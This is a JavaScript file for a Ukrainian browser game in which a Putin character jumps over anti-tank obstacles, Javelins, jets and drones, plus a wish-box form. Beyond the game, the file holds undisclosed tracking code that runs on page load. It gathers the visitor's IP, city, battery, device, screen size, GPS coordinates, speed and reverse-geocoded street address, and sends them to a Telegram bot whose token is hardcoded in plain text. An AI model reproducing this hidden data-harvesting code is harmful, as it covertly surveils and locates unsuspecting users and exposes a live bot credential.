const putin = document.querySelector('.putin')
const antitank = document.querySelector('.antitankStartPos')
const buttonJump = document.querySelector('.btnJump')
const startButton = document.querySelector('.btnStart')
const secondElement = document.querySelector('.second')
const bestResultElement = document.querySelector('.best-result')
const levelImg = document.querySelector('.levelImg')
const roadSign = document.querySelector('.roadSign')

const audioPlayer = document.getElementById('audioPlayer')

const volumeControl = document.getElementById('volumeControl')

const defenceNameElement = document.querySelector('.defenceName')

volumeControl.addEventListener('input', () => {
  audioSong.volume = volumeControl.value
})

window.addEventListener('load', function () {
  // startListening()
})

// Start Game and Timer and Music

document.addEventListener('keydown', function (event) {
  if (event.code === 'Enter') {
    start()
    clearInterval(interval)
    interval = setInterval(startTimer, 10)
    soundStart()
    startButton.style.visibility = 'hidden'
  }
})

startButton.addEventListener('click', function () {
  start()
  clearInterval(interval)
  interval = setInterval(startTimer, 10)
  soundStart()
  startButton.style.visibility = 'hidden'
})

function start() {
  if (antitank.classList !== 'antitank') {
    antitank.classList.add('antitank')
    putin.classList.remove('putin-in-Gaaga')
    putin.classList.add('putin')
    updateMessageAntitank()
  }
}

// putin jump

document.addEventListener('keydown', function (event) {
  if (event.code === 'Space') {
    jump()
  }
})

buttonJump.addEventListener('click', function () {
  jump()
})

function jump() {
  if (putin.classList != 'jump' && putin.classList != 'putin-in-Gaaga') {
    putin.classList.add('jump')
    soundAfterJumpStart()
  }
  setTimeout(function () {
    putin.classList.remove('jump')
  }, 350)
}

// Level name functions
function updateMessageAntitank() {
  defenceNameElement.textContent = 'Протитанковий їжак'
}
function updateMessageJavelin() {
  defenceNameElement.textContent = 'Джавелін'
}
function updateMessageJet() {
  defenceNameElement.textContent = 'F-16'
}
function updateMessageFpv() {
  defenceNameElement.textContent = 'Русоріз Стерненка'
}
function updateMessageHague() {
  defenceNameElement.textContent = 'Міжнародний суд в Гаазі'
}

// Timer

let second = 00
let millisecond = 00
let interval
let bestResult = 00

function win() {
  if (second === 30) {
    clearInterval(interval)
    soundStop(audioSong)
    putin.classList.remove('putin')
    putin.classList.add('putin-in-Gaaga')
    antitank.classList.remove('antitank')
    startButton.style.visibility = 'hidden'
    antitank.classList.remove('rocket')
    levelImg.classList.remove('javelin')
    antitank.classList.remove('jet')
    antitank.classList.remove('fpv')
    second = 0
    startButton.style.visibility = 'visible'
    bestResultElement.innerText = 0
    bestResultElement.innerText = second
    sendWinMessage()

    alert('Вітаємо! Ви виграли! Путін дожив до Гааги!')
    bestResultElement.innerText = 0
    soundInGaagaStart()
    updateMessageHague()
  }
}

function startTimer() {
  millisecond++

  if (millisecond > 99) {
    second++
    secondElement.innerText = '0' + second
    millisecond = 0
  }
  increaseScore()
  win()
}

function increaseScore() {
  if (second >= 8 && second < 14) {
    antitank.classList.remove('antitank', 'antitankStartPos')
    antitank.classList.add('rocket')
    levelImg.classList.add('javelin')
    roadSign.classList.add('roadSignVisibility')
    updateMessageJavelin()
  } else if (second >= 14 && second < 23) {
    antitank.classList.remove('rocket')
    levelImg.classList.remove('javelin')
    antitank.classList.add('jet')
    updateMessageJet()
  } else if (second >= 23) {
    antitank.classList.remove('jet')
    antitank.classList.add('fpv')
    updateMessageFpv()
  }
}

// putin died and result control

let isAlive = setInterval(function () {
  let putinTop = parseInt(
    window.getComputedStyle(putin).getPropertyValue('top')
  )
  let antitankLeft = parseInt(
    window.getComputedStyle(antitank).getPropertyValue('left')
  )
  console.log('putinTop:', putinTop, 'antitankLeft:', antitankLeft)
  if (putinTop >= 150 && antitankLeft < 50 && antitankLeft > 25) {
    soundStop(audioSong)
    startButton.style.visibility = 'visible'
    alert('путін ЗДОХ! :)')
    antitank.classList.add('antitank', 'antitankStartPos')
    antitank.classList.remove('rocket')
    levelImg.classList.remove('javelin')
    antitank.classList.remove('jet')
    antitank.classList.remove('fpv')
    roadSign.classList.remove('roadSignVisibility')

    if (second > bestResult) {
      bestResult = second
      bestResultElement.innerText = second
    } else if (second < bestResult) {
      bestResultElement.innerText = bestResult
    }

    second = 0
    clearInterval(interval)
    antitank.classList.remove('antitank')
  }
}, 1)

// Music

let audioSong
function soundStart() {
  audioSong = new Audio('./audio/Скрябін_Коломийки.mp3')
  audioSong.volume = 0.05
  audioSong.play()
  audioPlayer.style.display = 'block'
}
function soundStop(audioSong) {
  audioSong.pause()
  audioSong.currentTime = 0
}
let audioAfterJump
function soundAfterJumpStart() {
  audioAfterJump = new Audio('./audio/hrenas-dva.mp3')
  audioAfterJump.play()
}
let audioInGaaga
function soundInGaagaStart() {
  audioInGaaga = new Audio('./audio/potomu-chto-potomu.mp3')
  audioInGaaga.play()
}

// Popup

let popupBg = document.querySelector('.popup__bg')
let popup = document.querySelector('.popup')
let openPopupButtons = document.querySelectorAll('.open-popup')
let closePopupButton = document.querySelector('.close-popup')

openPopupButtons.forEach((button) => {
  button.addEventListener('click', (e) => {
    e.preventDefault()
    popupBg.classList.add('active')
    popup.classList.add('active')
  })
})

closePopupButton.addEventListener('click', () => {
  popupBg.classList.remove('active')
  popup.classList.remove('active')
  success.style.display = 'none'
})

document.addEventListener('click', (e) => {
  if (e.target === popupBg) {
    popupBg.classList.remove('active')
    popup.classList.remove('active')
    success.style.display = 'none'
  }
})

// Send form to telegram

const TOKEN = '6199072332:AAH0FNRe-xweyv3SfXdoMbojgCfBFAIkClQ'
const CHAT_ID = '-1001569099157'
const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`
const URI_API_DOC = `https://api.telegram.org/bot${TOKEN}/sendDocument`
const success = document.getElementById('success')

document.querySelector('.popup').addEventListener('submit', function (e) {
  e.preventDefault()

  let message = `<b>Скринька побажань путіну</b>\n`
  message += `<b>Відправник: </b>${this.name.value}\n`
  message += `<b>Побажання: </b>${this.message.value}\n`

  if (this.name.value === '' || this.message.value === '') {
    success.innerHTML = 'Заповніть будь ласка поля!'
    success.style.display = 'block'
  } else {
    axios
      .post(URI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message,
      })
      .then((res) => {
        this.name.value = ''
        this.message.value = ''
        success.innerHTML = 'Ваше побажання відправлено!'
        success.style.display = 'block'
      })

      .catch((err) => {})

      .finally(() => {})
  }
})

// Telegram message visits and win

function sendVisitMessage() {
  let message = `<b>Відвідування гри "путін здох!"</b>\n`

  axios.post(URI_API, {
    chat_id: CHAT_ID,
    parse_mode: 'html',
    text: message,
  })
}

function sendWinMessage() {
  let message = `<b>Гра "путін здох!" пройдена"</b>\n`

  axios.post(URI_API, {
    chat_id: CHAT_ID,
    parse_mode: 'html',
    text: message,
  })
}

// Get User Data

let info = new Userinfo()

let batteryStatus
let batteryLevel
let lat
let long
let userSpeed
let screenWidth
let screenHeight
let userIp
let userIpCity

async function t1() {
  const ipData = await info.ip()
  userIp = ipData.ipAddress
  userIpCity = ipData.city

  const userBattery = await info.battery()
  let status

  status = userBattery.charging
  if (status === true) {
    batteryStatus = 'Батарея на зарядці'
  } else if (status === false) {
    batteryStatus = 'Батарея не заряджається'
  }
  batteryLevel = userBattery.level

  const userPosition = await info.position()

  lat = userPosition.lat
  long = userPosition.long
  userSpeed = userPosition.speed
  console.log(userPosition)
}
t1().then(() => getAddress())

function t2() {
  screenWidth = info.sizeScreen().screenAvailWidth
  screenHeight = info.sizeScreen().screenAvailHeight
  console.log(info.browserInfo())
}
t2()

let userPosCity
let userDistrict
let userRoad
let userHouse
let userPostcode

function getAddress() {
  const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${long}`

  fetch(url)
    .then((response) => response.json())
    .then((data) => {
      userPosCity = data.address.city
      userDistrict = data.address.district
      userRoad = data.address.road
      userHouse = data.address.house_number
      userPostcode = data.address.postcode

      console.log(data.address)
    })
    .catch((error) => {
      console.error(error)
    })
}

// Type of the device

const userAgent = navigator.userAgent
const mobileRegex =
  /(iPhone|iPod|iPad|Android|BlackBerry|Windows Phone|webOS|Mobile)/i

let model

if (mobileRegex.test(userAgent)) {
  const modelRegex =
    /(iPhone|iPod|iPad|Android|BlackBerry|Windows Phone|webOS)/i
  model = userAgent.match(modelRegex)[0]
  console.log(`The user's mobile device model is: ${model}`)
} else {
  console.log('The user is not using a mobile device.')

  model = "Комп'ютер"
}

function sendUserDataMessage() {
  let message = `<b>Параметри відвідувача</b>\n`
  message += `<b>Телефон: </b>${model}\n`
  message += `<b>Статус батареї: </b>${batteryStatus}\n`
  message += `<b>Заряд батареї: </b>${batteryLevel}\n`
  message += `<b>Розмір екрана: </b>${screenWidth}x${screenHeight}\n`
  message += `<b>Координати: </b>${lat}, ${long}\n`
  message += `<b>Адреса: </b>${userPosCity}, ${userDistrict}, ${userRoad}, ${userHouse}, ${userPostcode}\n`
  message += `<b>Швидкість: </b>${userSpeed}\n`
  message += `<b>IP адреса: </b>${userIp}\n`
  message += `<b>Місто за IP: </b>${userIpCity}\n`

  axios.post(URI_API, {
    chat_id: CHAT_ID,
    parse_mode: 'html',
    text: message,
  })
}

document.addEventListener('DOMContentLoaded', function () {
  sendVisitMessage()
  setTimeout(() => {
    sendUserDataMessage()
  }, 20000)
})

// PuckJS button

// function startListening() {
//   setInterval(function () {
//     Puck.eval('BTN.read()', function (x) {
//       console.log(x)
//       if (x) {
//         jump()
//       }
//     })
//   }, 10)
// }
